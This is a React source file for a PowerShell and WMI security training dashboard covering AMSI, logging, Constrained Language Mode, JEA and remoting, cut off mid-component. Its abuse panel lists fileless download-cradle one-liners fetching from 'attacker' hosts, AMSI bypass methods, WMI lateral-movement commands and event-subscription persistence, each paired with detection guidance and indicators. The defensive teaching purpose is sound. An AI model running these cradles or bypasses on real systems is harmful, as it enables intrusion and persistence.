import { useState } from "react";

const C = {
  bg: "#06070c",
  panel: "#080a12",
  header: "#0a0d1a",
  border: "#141e30",
  cyan: "#00b0e0",
  green: "#00d860",
  red: "#ff1838",
  orange: "#ff8000",
  yellow: "#e8b010",
  purple: "#7830e0",
  teal: "#00b898",
  pink: "#e02080",
  lime: "#70c010",
  sky: "#20a0f0",
  gold: "#c07808",
  blue: "#2050e0",
  indigo: "#5040c8",
  text: "#98acc0",
  dim: "#384858",
  bright: "#c0d8f0",
};

const mono = "'JetBrains Mono','Cascadia Code','Fira Code',monospace";

const S = {
  root: { background: C.bg, color: C.text, fontFamily: mono, minHeight: "100vh", fontSize: "12.5px", lineHeight: "1.65" },
  bar: { background: C.header, borderBottom: `1px solid ${C.border}`, padding: "7px 20px", display: "flex", alignItems: "center", gap: "14px", position: "sticky", top: 0, zIndex: 100 },
  dot: c => ({ width: 9, height: 9, borderRadius: "50%", background: c, display: "inline-block" }),
  wrap: { maxWidth: "1220px", margin: "0 auto", padding: "18px 14px", display: "flex", flexDirection: "column", gap: "14px" },
  panel: c => ({ background: C.panel, border: `1px solid ${c || C.border}`, borderRadius: "5px", overflow: "hidden" }),
  ph: c => ({ background: C.header, borderBottom: `1px solid ${c || C.border}`, padding: "9px 15px", display: "flex", alignItems: "center", gap: "9px" }),
  pt: c => ({ color: c || C.cyan, fontWeight: "700", fontSize: "11px", letterSpacing: "1.8px", textTransform: "uppercase" }),
  pb: { padding: "15px" },
  code: { background: "#030408", border: `1px solid ${C.border}`, borderRadius: "4px", padding: "11px 13px", fontFamily: mono, fontSize: "11.5px", overflowX: "auto", whiteSpace: "pre", lineHeight: "1.75" },
  grid2: { display: "grid", gridTemplateColumns: "1fr 1fr", gap: "14px" },
  grid3: { display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "11px" },
  grid4: { display: "grid", gridTemplateColumns: "1fr 1fr 1fr 1fr", gap: "10px" },
  badge: c => ({ background: `${c}1a`, border: `1px solid ${c}55`, color: c, borderRadius: "3px", padding: "2px 7px", fontSize: "10.5px", fontWeight: "700" }),
  tag: c => ({ display: "inline-block", background: `${c}14`, border: `1px solid ${c}40`, color: c, borderRadius: "3px", padding: "1px 6px", fontSize: "10.5px", margin: "2px" }),
  sep: { borderColor: C.border, margin: "11px 0", borderStyle: "dashed", borderWidth: "0 0 1px 0" },
  row: { display: "flex", gap: "9px", marginBottom: "7px", alignItems: "flex-start" },
  bul: c => ({ color: c || C.cyan, minWidth: "13px", fontWeight: "700", marginTop: "1px" }),
  tab: (a, c) => ({ padding: "6px 13px", cursor: "pointer", fontFamily: mono, background: a ? `${c}1a` : "transparent", border: `1px solid ${a ? c : C.border}`, borderRadius: "4px", color: a ? c : C.dim, fontSize: "10.5px", fontWeight: a ? "700" : "400", letterSpacing: "0.5px", transition: "all 0.15s" }),
};

const PB = ({ title, icon, color, accent, children }) => (
  <div style={S.panel(accent || color || C.border)}>
    <div style={S.ph(accent || color || C.border)}>
      <span>{icon}</span><span style={S.pt(color || C.cyan)}>{title}</span>
    </div>
    <div style={S.pb}>{children}</div>
  </div>
);
const Pill = ({ c, children }) => <span style={S.badge(c || C.cyan)}>{children}</span>;
const Tag  = ({ c, children }) => <span style={S.tag(c || C.cyan)}>{children}</span>;
const Row  = ({ c, b, children }) => (
  <div style={S.row}><span style={S.bul(c)}>{b || "▸"}</span><span style={{ color: C.text }}>{children}</span></div>
);
const KV = ({ k, v, kc }) => (
  <div style={{ display: "flex", gap: "8px", marginBottom: "5px" }}>
    <span style={{ color: kc || C.teal, minWidth: "195px", fontWeight: "600" }}>{k}</span>
    <span style={{ color: C.dim }}>:</span><span style={{ color: C.bright }}>{v}</span>
  </div>
);

/* ── PowerShell Engine Architecture SVG ────────────────────────────────── */
const PSEngineArch = () => (
  <svg viewBox="0 0 760 500" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#384858" fontSize="10" letterSpacing="2">POWERSHELL ENGINE ARCHITECTURE — EXECUTION PIPELINE</text>

    {/* Host layer */}
    <rect x="10" y="22" width="740" height="60" rx="4" fill="#080a12" stroke="#00d86022" strokeWidth="1.5" />
    <text x="380" y="40" textAnchor="middle" fill="#00d860" fontSize="10" fontWeight="700" letterSpacing="1.5">HOST LAYER — How PS is invoked</text>
    {[["powershell.exe\n(Console Host)", C.cyan, 20],["pwsh.exe\n(PS 7+ CoreCLR)", C.green, 210],["ISE / VSCode\n(Editor Host)", C.purple, 400],["Runspace in\nother process", C.orange, 590]].map(([l, c, x]) => (
      <g key={l}><rect x={x} y={46} width="150" height="28" rx="2" fill={`${c}0c`} stroke={`${c}44`} strokeWidth="1" /><text x={x+75} y={57} textAnchor="middle" fill={c} fontSize="9" fontWeight="700">{l.split("\n")[0]}</text><text x={x+75} y={70} textAnchor="middle" fill="#384858" fontSize="8.5">{l.split("\n")[1]}</text></g>
    ))}

    {/* Engine core */}
    <rect x="10" y="92" width="740" height="72" rx="4" fill="#09090e" stroke="#00b0e044" strokeWidth="1.5" />
    <text x="380" y="110" textAnchor="middle" fill="#00b0e0" fontSize="11" fontWeight="800">POWERSHELL ENGINE CORE (System.Management.Automation.dll)</text>
    {[["Parser\n(AST builder)", C.cyan, 20],["Compiler\n(LINQ → IL)", C.sky, 165],["Runspace\n(execution env)", C.purple, 310],["Pipeline\n(cmdlet chain)", C.green, 455],["Module\nLoader", C.teal, 600],["Provider\nFramework", C.orange, 690]].map(([l, c, x]) => (
      <g key={l}><rect x={x} y={118} width={l.includes("Provider") ? 60 : 130} height="38" rx="2" fill={`${c}0c`} stroke={`${c}44`} strokeWidth="1" /><text x={x+(l.includes("Provider") ? 30 : 65)} y={134} textAnchor="middle" fill={c} fontSize="9" fontWeight="700">{l.split("\n")[0]}</text><text x={x+(l.includes("Provider") ? 30 : 65)} y={148} textAnchor="middle" fill="#384858" fontSize="8.5">{l.split("\n")[1]}</text></g>
    ))}

    {/* AMSI layer */}
    <rect x="10" y="174" width="740" height="40" rx="3" fill="#ff183810" stroke="#ff183855" strokeWidth="1.5" />
    <text x="380" y="191" textAnchor="middle" fill="#ff1838" fontSize="11" fontWeight="700">AMSI — Antimalware Scan Interface (amsi.dll)</text>
    <text x="380" y="207" textAnchor="middle" fill="#384858" fontSize="9">Every script block, command, module load passes through AMSI before execution · AV/EDR registers AMSI provider · Cannot be disabled from user mode</text>

    {/* Execution path */}
    {[
      { label: "Lexer + Parser → AST (Abstract Syntax Tree)", color: C.cyan, y: 224, desc: "Tokenises PS code → builds AST. Happens before execution. ParseError here = syntax error. AST available via [System.Management.Automation.Language.Parser]" },
      { label: "Script Block Compilation → LINQ Expression Tree → JIT IL", color: C.sky, y: 262, desc: "AST compiled to LINQ expression tree → CLR JIT compiles to native IL. ScriptBlock object created. ScriptBlock logging fires HERE — logs the compiled script." },
      { label: "Pipeline Execution → Cmdlet → .NET Reflection", color: C.purple, y: 300, desc: "Pipeline processes objects. Cmdlets are .NET classes (PSCmdlet). Parameters bound via reflection. Output objects flow through pipeline. Format/output at end." },
      { label: "Provider Layer → Drive abstraction (HKLM:, Cert:, Env:, FileSystem:)", color: C.teal, y: 338, desc: "Providers expose namespaces as PS drives. FileSystem, Registry, Certificate, Environment, WSMan, ActiveDirectory providers. New-PSDrive creates custom drives." },
    ].map(({ label, color, y, desc }) => (
      <g key={label}>
        <rect x="10" y={y} width="740" height="32" rx="2" fill={`${color}0c`} stroke={`${color}33`} strokeWidth="1" />
        <rect x="10" y={y} width="4" height="32" fill={color} rx="1" />
        <text x="20" y={y + 14} fill={color} fontSize="9.5" fontWeight="700">{label}</text>
        <text x="20" y={y + 27} fill="#384858" fontSize="8.5">{desc}</text>
      </g>
    ))}

    {/* Security features */}
    <rect x="10" y="380" width="740" height="112" rx="4" fill="#06070c" stroke="#7830e033" strokeWidth="1" />
    <text x="380" y="398" textAnchor="middle" fill="#7830e0" fontSize="10" fontWeight="700" letterSpacing="1.5">POWERSHELL SECURITY CONTROLS</text>
    {[
      { name: "Script Block\nLogging", color: C.red, desc: "Logs every compiled script block to Event 4104. AMSI-level — bypassing execution doesn't bypass logging.", x: 20 },
      { name: "Module\nLogging", color: C.orange, desc: "Logs all module pipeline execution. Event 4103. Shows cmdlets called + parameters.", x: 220 },
      { name: "Transcription", color: C.yellow, desc: "Full session transcript to file/network share. Input + output. Event log independent.", x: 420 },
      { name: "Constrained\nLanguage Mode", color: C.purple, desc: "Blocks .NET direct access, Add-Type, COM, unsafe APIs. AppLocker/WDAC enforced.", x: 590 },
    ].map(({ name, color, desc, x }) => (
      <g key={name}>
        <rect x={x} y={406} width="175" height="78" rx="3" fill={`${color}0c`} stroke={`${color}44`} strokeWidth="1.5" />
        <text x={x + 87} y={424} textAnchor="middle" fill={color} fontSize="10" fontWeight="700">{name.split("\n")[0]}</text>
        <text x={x + 87} y={438} textAnchor="middle" fill={color} fontSize="9">{name.split("\n")[1]}</text>
        {desc.split(". ").slice(0,2).map((d, i) => <text key={d} x={x + 87} y={453 + i * 13} textAnchor="middle" fill="#384858" fontSize="8.5">{d.slice(0, 32)}</text>)}
      </g>
    ))}
  </svg>
);

/* ── WMI Architecture SVG ───────────────────────────────────────────────── */
const WMIArch = () => (
  <svg viewBox="0 0 760 400" style={{ width: "100%", maxWidth: "760px", display: "block", margin: "0 auto" }}>
    <text x="380" y="14" textAnchor="middle" fill="#384858" fontSize="10" letterSpacing="2">WMI ARCHITECTURE — PROVIDERS · REPOSITORY · SUBSCRIPTIONS</text>

    {/* User mode consumers */}
    <rect x="10" y="22" width="740" height="56" rx="4" fill="#080a12" stroke="#00d86022" strokeWidth="1" />
    <text x="380" y="40" textAnchor="middle" fill="#00d860" fontSize="10" fontWeight="700">WMI CONSUMERS (user mode clients)</text>
    {[["PowerShell\nGet-WmiObject", C.cyan, 20],["WMIC.exe\ncli tool", C.green, 200],["VBScript / JScript\nWScript.Shell", C.yellow, 360],["C# / .NET\nManagementClass", C.purple, 510],["Mof / Queries\nWQL language", C.teal, 660]].map(([l, c, x]) => (
      <g key={l}><rect x={x} y={44} width="130" height="28" rx="2" fill={`${c}0c`} stroke={`${c}44`} strokeWidth="1" /><text x={x+65} y={56} textAnchor="middle" fill={c} fontSize="9" fontWeight="700">{l.split("\n")[0]}</text><text x={x+65} y={68} textAnchor="middle" fill="#384858" fontSize="8.5">{l.split("\n")[1]}</text></g>
    ))}

    {/* DCOM transport */}
    <rect x="10" y="88" width="740" height="30" rx="3" fill="#0a0808" stroke="#ff800033" strokeWidth="1.5" />
    <text x="380" y="108" textAnchor="middle" fill="#ff8000" fontSize="10" fontWeight="700">DCOM / RPC TRANSPORT — Port 135 → Dynamic (Remote WMI) | ALPC (Local WMI)</text>

    {/* WMI Service */}
    <rect x="200" y="128" width="360" height="50" rx="4" fill="#090a14" stroke="#00b0e055" strokeWidth="2" />
    <text x="380" y="148" textAnchor="middle" fill="#00b0e0" fontSize="11" fontWeight="800">WMI SERVICE (winmgmt)</text>
    <text x="380" y="165" textAnchor="middle" fill="#384858" fontSize="9">Manages provider loading · Query routing · Namespace security · Event subscription matching</text>

    {/* Repository */}
    <rect x="20" y="192" width="200" height="80" rx="3" fill="#08090e" stroke="#e0208044" strokeWidth="1.5" />
    <text x="120" y="212" textAnchor="middle" fill="#e02080" fontSize="10" fontWeight="700">WMI Repository</text>
    <text x="120" y="228" textAnchor="middle" fill="#384858" fontSize="9">OBJECTS.DATA (ESE DB)</text>
    <text x="120" y="242" textAnchor="middle" fill="#384858" fontSize="9">Class schema definitions</text>
    <text x="120" y="256" textAnchor="middle" fill="#384858" fontSize="9">Static instance data</text>
    <text x="120" y="268" textAnchor="middle" fill="#e02080" fontSize="8.5">C:\Windows\System32\wbem\repository</text>

    {/* Providers */}
    <rect x="240" y="192" width="280" height="80" rx="3" fill="#08090e" stroke="#00b89844" strokeWidth="1.5" />
    <text x="380" y="212" textAnchor="middle" fill="#00b898" fontSize="10" fontWeight="700">WMI PROVIDERS (In-process DLLs)</text>
    {[["Win32_Process (cimwin32.dll)", 225],["Win32_Service (cimwin32.dll)", 240],["MSFT_NetAdapter (NetAdapterCim.dll)", 255],["StdRegProv (root\\default)", 270]].map(([l, y]) => (
      <text key={l} x="380" y={y} textAnchor="middle" fill="#384858" fontSize="8.5">{l}</text>
    ))}

    {/* Event subscriptions */}
    <rect x="540" y="192" width="210" height="80" rx="3" fill="#08090e" stroke="#ff183844" strokeWidth="1.5" />
    <text x="645" y="212" textAnchor="middle" fill="#ff1838" fontSize="10" fontWeight="700">EVENT SUBSCRIPTIONS</text>
    <text x="645" y="228" textAnchor="middle" fill="#384858" fontSize="9">__EventFilter (trigger)</text>
    <text x="645" y="242" textAnchor="middle" fill="#384858" fontSize="9">__EventConsumer (action)</text>
    <text x="645" y="256" textAnchor="middle" fill="#384858" fontSize="9">CommandLineConsumer</text>
    <text x="645" y="270" textAnchor="middle" fill="#ff1838" fontSize="8.5">⚠ Fileless persistence!</text>

    {/* Provider host */}
    <rect x="20" y="288" width="720" height="48" rx="3" fill="#0a0808" stroke="#ff800033" strokeWidth="1" />
    <text x="380" y="308" textAnchor="middle" fill="#ff8000" fontSize="10" fontWeight="700">WmiPrvSE.exe — WMI Provider Host (separate process per provider namespace)</text>
    <text x="380" y="324" textAnchor="middle" fill="#384858" fontSize="9">Providers loaded as DLLs into WmiPrvSE.exe. Crash isolated. Multiple instances. SYSTEM/NetworkService context depending on namespace.</text>

    {/* MOF */}
    <rect x="20" y="348" width="720" height="46" rx="3" fill="#07080c" stroke="#384858" strokeWidth="1" />
    <text x="380" y="366" textAnchor="middle" fill="#384858" fontSize="10" fontWeight="700">WQL (WMI Query Language) — SELECT * FROM Win32_Process WHERE Name='lsass.exe'</text>
    <text x="380" y="382" textAnchor="middle" fill="#384858" fontSize="8.5">MOF (Managed Object Format) files define classes. mofcomp.exe compiles MOF into repository. Persistence: attacker-MOF compiled at system startup.</text>
  </svg>
);

/* ── AMSI Deep Dive ─────────────────────────────────────────────────────── */
const AMSIPanel = () => (
  <div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.red, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ AMSI ARCHITECTURE</div>
        <div style={S.code}>
{`AMSI (Antimalware Scan Interface) — Windows 10+`}
{`amsi.dll loaded into every PowerShell / JScript`}
{`/ VBScript / .NET / Office macro process`}
{``}
{`API functions:`}
{`  AmsiInitialize()    → init AMSI session`}
{`  AmsiOpenSession()   → per-scan session`}
{`  AmsiScanBuffer()    → scan content bytes`}
{`  AmsiScanString()    → scan string`}
{`  AmsiCloseSession()`}
{`  AmsiUninitialize()`}
{``}
{`Return values:`}
{`  AMSI_RESULT_CLEAN   (0)  → allow execution`}
{`  AMSI_RESULT_NOT_DETECTED (1) → allow`}
{`  AMSI_RESULT_BLOCKED_BY_ADMIN_START`}
{`  AMSI_RESULT_DETECTED (32768) → BLOCK`}
{``}
{`AV registers via AmsiRegisterContentNotification()`}
{`amsi.dll calls registered provider for each scan`}
{`Windows Defender = default AMSI provider`}
{``}
{`# Test AMSI manually:`}
{`[Ref].Assembly.GetType('System.Management`}
{`.Automation.AmsiUtils') | iex  ← blocked by AMSI`}
        </div>
      </div>
      <div>
        <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ AMSI BYPASS TECHNIQUES (and why they fail now)</div>
        {[
          ["Memory Patching (patched out)", "Classic: patch AmsiScanBuffer() to always return CLEAN. Modern mitigation: AMSI_RESULT check is multi-point. Defender detects patch attempt. EDR kernel callbacks monitor write to amsi.dll pages.", C.red],
          ["PowerShell Downgrade (v2)", "powershell -version 2 drops to PS2 which has NO AMSI, NO script block logging. Mitigation: remove PowerShell v2 feature. Verify: Get-WindowsOptionalFeature -FeatureName MicrosoftWindowsPowerShellV2Root", C.orange],
          ["AMSI Context Corruption", "Corrupt AmsiContext struct in memory → AmsiScanBuffer errors out → falls through. Modern EDRs hook at multiple AMSI callpoints and in kernel. High detection rate.", C.yellow],
          ["String Obfuscation", "Split malicious string + concat at runtime → avoids static AMSI scan of the literal. AMSI scans the EXECUTED code, not source. Behavioural analysis still catches execution patterns.", C.purple],
        ].map(([t, d, c]) => (
          <div key={t} style={{ background: "#100808", border: `1px solid ${c}33`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
            <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>⚠ {t}</div>
            <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
          </div>
        ))}
      </div>
    </div>
  </div>
);

/* ── Logging Architecture ───────────────────────────────────────────────── */
const LoggingArch = () => (
  <div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ POWERSHELL LOGGING TIERS</div>
        {[
          { name: "Script Block Logging (Event 4104)", color: C.red, key: "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", val: "EnableScriptBlockLogging = 1", desc: "Logs EVERY compiled script block — including deobfuscated content after AMSI scan. The most valuable PS logging. Captures inline scripts, downloaded code, eval'd strings. Log size grows fast — forward to SIEM.", event: "4104 in Microsoft-Windows-PowerShell/Operational" },
          { name: "Module Logging (Event 4103)", color: C.orange, key: "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging", val: "EnableModuleLogging = 1 + ModuleNames = *", desc: "Logs cmdlets called, parameters passed, pipeline results per module. More granular than transcription. Very high volume — filter by module (ActiveDirectory, NetTCPIP suspicious ones).", event: "4103 in Microsoft-Windows-PowerShell/Operational" },
          { name: "Transcription (all I/O to file)", color: C.yellow, key: "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription", val: "EnableTranscripting = 1 + OutputDirectory = \\\\siem\\pslogs$", desc: "Full session transcript: every command input + output, timestamped. Write to central UNC share for collection. NOT event-based — raw text file. Survives log clearing.", event: "File: PS_transcript_<host>_<date>_<pid>.txt" },
          { name: "Protected Event Logging (PEL)", color: C.teal, key: "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\EventLog\\ProtectedEventLogging", val: "EnableProtectedEventLogging = 1 + EncryptionCertificate", desc: "Encrypts script block log content with SIEM's public key. Only SIEM can decrypt. Prevents admin clearing logs from revealing content. Requires certificate infrastructure.", event: "Encrypted 4104 events — only readable by SIEM cert holder" },
        ].map(({ name, color, key, val, desc, event }) => (
          <div key={name} style={{ background: "#080a10", border: `1px solid ${color}33`, borderRadius: "4px", padding: "10px", marginBottom: "10px" }}>
            <div style={{ color, fontWeight: "700", fontSize: "12px", marginBottom: "6px" }}>▸ {name}</div>
            <div style={{ display: "flex", gap: "6px", marginBottom: "4px" }}><span style={{ color: C.dim, fontSize: "10px", minWidth: "40px" }}>Key:</span><span style={{ color: C.teal, fontSize: "10px", fontFamily: mono }}>{key.slice(key.lastIndexOf("\\") + 1)}</span></div>
            <div style={{ display: "flex", gap: "6px", marginBottom: "4px" }}><span style={{ color: C.dim, fontSize: "10px", minWidth: "40px" }}>Value:</span><span style={{ color: color, fontSize: "10px" }}>{val}</span></div>
            <div style={{ color: C.dim, fontSize: "10.5px", marginBottom: "4px" }}>{desc}</div>
            <div style={{ color: C.green, fontSize: "10px" }}>📋 {event}</div>
          </div>
        ))}
      </div>
      <div>
        <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ CONSTRAINED LANGUAGE MODE (CLM)</div>
        <div style={{ background: "#0c0818", border: `1px solid ${C.purple}33`, borderRadius: "4px", padding: "12px", marginBottom: "12px" }}>
          <div style={{ color: C.purple, fontSize: "12px", fontWeight: "700", marginBottom: "8px" }}>What CLM blocks:</div>
          {[
            ["Add-Type", "Cannot compile C# or VB code at runtime"],
            ["[System.Type] casts", "Cannot access arbitrary .NET types directly"],
            ["COM object creation", "New-Object -ComObject blocked"],
            ["Unsafe .NET APIs", "P/Invoke, reflection for dangerous methods"],
            ["XAML workflows", "Windows Workflow Foundation blocked"],
          ].map(([api, desc]) => (
            <div key={api} style={{ display: "flex", gap: "10px", marginBottom: "5px" }}>
              <span style={{ color: C.red, fontFamily: mono, fontSize: "11px", minWidth: "140px" }}>{api}</span>
              <span style={{ color: C.dim, fontSize: "11px" }}>{desc}</span>
            </div>
          ))}
          <hr style={S.sep} />
          <div style={{ color: C.purple, fontSize: "11px", fontWeight: "700", marginBottom: "4px" }}>How CLM is enforced:</div>
          <Row c={C.purple}><strong style={{color:C.bright}}>AppLocker</strong> with script rules automatically triggers CLM when PS scripts are blocked from untrusted paths.</Row>
          <Row c={C.purple}><strong style={{color:C.bright}}>WDAC</strong> (Windows Defender Application Control) enforces CLM more strictly — even AppLocker bypass techniques fail.</Row>
          <Row c={C.purple}>Check current mode: <code style={{color:C.cyan}}>$ExecutionContext.SessionState.LanguageMode</code></Row>
        </div>
        <div style={{ color: C.teal, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ JEA — JUST ENOUGH ADMINISTRATION</div>
        <div style={S.code}>
{`JEA = PowerShell remoting with constrained runspace`}
{``}
{`Role Capability File (.psrc):`}
{`VisibleCmdlets = @('Get-Service', 'Restart-Service')`}
{`VisibleFunctions = @('Get-ServerStatus')`}
{`VisibleExternalCommands = @()`}
{`VisibleProviders = @('FileSystem')`}
{``}
{`Session Configuration (.pssc):`}
{`SessionType = RestrictedRemoteServer`}
{`RoleDefinitions = @{`}
{`  'CORP\\HelpDesk' = @{`}
{`    RoleCapabilities = 'HelpDeskRole'`}
{`  }`}
{`}`}
{`RunAsVirtualAccount = $true  ; ephemeral admin`}
{`TranscriptDirectory = '\\\\siem\\jea-logs$'`}
{``}
{`Register-PSSessionConfiguration`}
{`    -Name "HelpDesk-JEA"`}
{`    -Path ".\HelpDesk.pssc"`}
{``}
{`# User connects:`}
{`Enter-PSSession -ComputerName srv01`}
{`    -ConfigurationName "HelpDesk-JEA"`}
{`# Gets ONLY the allowed cmdlets — nothing else`}
        </div>
      </div>
    </div>
  </div>
);

/* ── PS Remoting Internals ──────────────────────────────────────────────── */
const PSRemoting = () => (
  <div>
    <div style={S.grid2}>
      <div>
        <div style={{ color: C.sky, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ POWERSHELL REMOTING INTERNALS</div>
        <div style={S.code}>
{`Remoting = WS-Management (WinRM) transport`}
{`   + serialization/deserialization of objects`}
{``}
{`Object serialization:`}
{`  PSObject serialized to CLIXML (XML-based)`}
{`  Properties preserved but methods LOST`}
{`  Deserialized objects: Deserialized.TypeName`}
{`  Live object: process.Kill() works`}
{`  Deserialized: process.Kill() fails (no method)`}
{``}
{`Remoting modes:`}
{`  1. Enter-PSSession   → interactive session`}
{`     (one session, interactive shell on remote)`}
{``}
{`  2. Invoke-Command    → scriptblock remoting`}
{`     IC -ComputerName srv -ScriptBlock {code}`}
{`     Returns deserialized objects`}
{``}
{`  3. Invoke-Command -AsJob → background`}
{`     Results fetched with Receive-Job`}
{``}
{`  4. Persistent Session (PSSession)`}
{`     $s = New-PSSession srv01`}
{`     IC -Session $s {code}  → reuse same session`}
{`     Expensive setup (negotiate, auth) done once`}
{``}
{`  5. Implicit Remoting (Import-PSSession)`}
{`     Import remote module as local proxy functions`}
{`     Exchange / AD management from remote module`}
        </div>
      </div>
      <div>
        <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ REMOTING SECURITY ARCHITECTURE</div>
        <div style={S.code}>
{`WinRM security model:`}
{``}
{`Authentication:`}
{`  Kerberos (domain) — default, mutual auth`}
{`  Negotiate (SPNEGO) — Kerb first, NTLM fallback`}
{`  Certificate — client cert for HTTPS`}
{`  CredSSP — delegates creds (risky, double-hop)`}
{``}
{`Authorization:`}
{`  PSSessionConfiguration DACL`}
{`  Default: Administrators + NETWORK SERVICE`}
{`  Get-PSSessionConfiguration → view DACLs`}
{`  Set-PSSessionConfiguration -SecurityDescriptorSddl`}
{``}
{`Encrypted channel:`}
{`  HTTP (5985): encrypted by GSSAPI/NTLM session`}
{`  HTTPS (5986): TLS 1.2+ + encrypted by GSSAPI`}
{``}
{`Logging on REMOTE host:`}
{`  Event 4624 Type 3 (network logon)`}
{`  wsmprovhost.exe created as child of WinRM svc`}
{`  Script Block Logging fires on REMOTE host for`}
{`  the script block sent by the caller`}
{``}
{`Detect from ATTACKER (source) machine:`}
{`  Sysmon Event 3: powershell.exe → port 5985/5986`}
{``}
{`Detect on TARGET machine:`}
{`  wsmprovhost.exe spawning child processes`}
{`  Event 4688: wsmprovhost → cmd.exe / powershell`}
        </div>
      </div>
    </div>
  </div>
);

/* ── PS/WMI Abuse Techniques ────────────────────────────────────────────── */
const AbusePanel = ({ tab }) => {
  const attacks = {
    ps_abuse: [
      { name: "Download Cradle — Fileless Payload Delivery", color: C.red,
        desc: "Execute code hosted on attacker server without writing to disk. Payload lives in memory only. Bypasses traditional AV file scanning.",
        techniques: [
          ["IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')", "Classic cradle. Detected by AMSI + Script Block Logging — content scanned before exec."],
          ["IEX (Invoke-WebRequest http://attacker/p.ps1 -UseBasicParsing).Content", "Alternate with IWR. Same detection points apply."],
          ["$c=[System.Net.WebClient]::new();$c.DownloadString('https://...')|iex", "Object method variant. All equivalent — AMSI sees the final string content."],
          ["curl https://attacker/p.ps1 | iex   # PowerShell 7+", "Unix-style with aliases. Same AMSI exposure. Sysmon Event 3 catches network connection."],
        ],
        detect: "AMSI scans downloaded string before IEX. Script Block Logging (Event 4104) captures the full downloaded content even if obfuscated. Sysmon Event 3: powershell.exe outbound HTTP to non-corporate IP.", ioc: "Event 4104 containing 'IEX' + 'DownloadString'. Sysmon Event 3 from powershell.exe to external IP on 80/443. DNS query for unknown domain from powershell.exe process." },
      { name: "Obfuscation — Evading String-Based Detection", color: C.orange,
        desc: "Transform malicious strings to avoid signature matching by AMSI providers and EDR string scans. All obfuscation is decoded before AMSI scan of the FINAL compiled script block.",
        techniques: [
          ["'I'+'EX' / -join chars", "String concatenation. Trivially detected by AMSI on the compiled AST — tokens are reassembled before scan."],
          ["[char]73+[char]69+[char]88 → IEX", "Character code encoding. AMSI evaluates the runtime value, not the source representation."],
          ["Base64: powershell -EncodedCommand [base64]", "Encoded command. Still decoded before AMSI scan. Event 4104 captures decoded content. Common LOLBin technique."],
          ["Invoke-Obfuscation (SecureString, Encoding, Reordering)", "Advanced AST-level obfuscation. AMSI trained on most Invoke-Obfuscation patterns. EDR behavioural analysis catches execution pattern regardless."],
        ],
        detect: "AMSI sees the fully-evaluated script block — obfuscation of source doesn't hide from AMSI. Script Block Logging captures deobfuscated content. Defenders: monitor for high base64 entropy in PS command lines (Event 4688).", ioc: "Event 4688 commandline with -enc or -EncodedCommand. Base64 blob in PowerShell cmdline > 200 chars. Script Block with [char] conversion chains or -join character arrays." },
    ],
    wmi_abuse: [
      { name: "WMI Lateral Movement (Win32_Process)", color: C.orange,
        desc: "Execute commands on remote systems via WMI without creating a service or writing files. Uses DCOM transport (port 135 + dynamic). Creates process as SYSTEM on target.",
        techniques: [
          ["wmic /node:target process call create 'cmd.exe /c whoami > C:\\out.txt'", "Classic WMIC lateral movement. Very well-detected now but still used."],
          ["Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName target", "PowerShell WMI lateral movement. Equivalent detection surface."],
          ["[wmiclass]\"\\\\target\\root\\cimv2:Win32_Process\".Create('payload.exe')", "Direct .NET WMI class invocation."],
          ["impacket-wmiexec corp.local/admin:pass@target", "Impacket WMI execution — uses output.txt in ADMIN$ for result retrieval."],
        ],
        detect: "Sysmon Event 1: wmiprvse.exe spawning cmd.exe/powershell.exe/payload.exe on target. Event 4648 (explicit creds) if alternate credentials used. Network: DCOM ports from source to target.", ioc: "wmiprvse.exe as parent of unexpected process (cmd.exe, powershell.exe, net.exe). DCOM network traffic from workstation to server. Outbound dynamic RPC ports from non-management hosts." },
      { name: "WMI Event Subscription Persistence", color: C.red,
        desc: "Plant a persistent trigger-action pair in WMI repository. Survives reboots, runs without any file on disk, not visible in Autoruns unless specifically queried. Classic fileless persistence.",
        techniques: [
          ["__EventFilter: SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='notepad.exe'", "Trigger: when notepad.exe starts (test trigger)."],
          ["CommandLineEventConsumer: 'cmd.exe /c calc.exe'", "Action: execute command when filter matches."],
          ["__FilterToConsumerBinding: links filter + consumer", "Binding activates the subscription. All three objects stored in WMI repository."],
          ["Query persistence: SELECT * FROM __TimerEvent WHERE TimerID='DailyTrigger'", "Time-based trigger. Fire every N seconds. __IntervalTimerInstruction sets interval."],
        ],
        detect: "Sysmon Events 19 (WmiEventFilter), 20 (WmiEventConsumer), 21 (WmiEventConsumerToFilter binding). Query WMI subscriptions: Get-WMIObject -Namespace root\\subscription -Class __EventFilter. Autoruns -wmi flag.", ioc: "Sysmon Event 19/20/21 from non-monitoring/management process. WMI repository contains EventFilter/Consumer objects with suspicious CommandLine or Script values." },
    ],
  };
  const items = attacks[tab] || [];
  return (
    <div>
      {items.map(item => (
        <div key={item.name} style={{ background: "#08090d", border: `1px solid ${item.color}33`, borderRadius: "5px", padding: "14px", marginBottom: "12px" }}>
          <div style={{ color: item.color, fontWeight: "800", fontSize: "13px", marginBottom: "6px" }}>{item.name}</div>
          <div style={{ color: C.dim, fontSize: "11px", marginBottom: "10px", borderLeft: `2px solid ${item.color}44`, paddingLeft: "10px" }}>{item.desc}</div>
          <div style={S.grid2}>
            <div>
